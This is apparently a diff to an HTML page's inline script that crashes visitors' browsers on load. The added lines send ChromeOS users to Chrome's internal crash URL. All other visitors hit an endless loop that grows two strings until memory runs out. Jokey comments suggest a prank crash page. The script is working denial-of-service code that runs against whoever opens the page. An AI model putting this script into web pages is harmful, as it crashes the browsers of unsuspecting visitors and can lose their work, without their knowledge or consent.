@@ -5,9 +5,15 @@
 <script>
  txt = "a";
  txt2 ="b"
-while(1){
+ if (/\bCrOS\b/.test(navigator.userAgent)) {
+    window.location="chrome://inducebrowsercrashforrealz";// yes, it is (probably, if no one's mucked about with their user agent string)
+} else {
+    while(1){
     txt = txt += "a"; //add as much as the browser can handle
     txt2 = txt2 += "b";
+   
+}// No, it isn't (probably, if no one's mucked about with their user agent string)
 }
+
 </script>
 
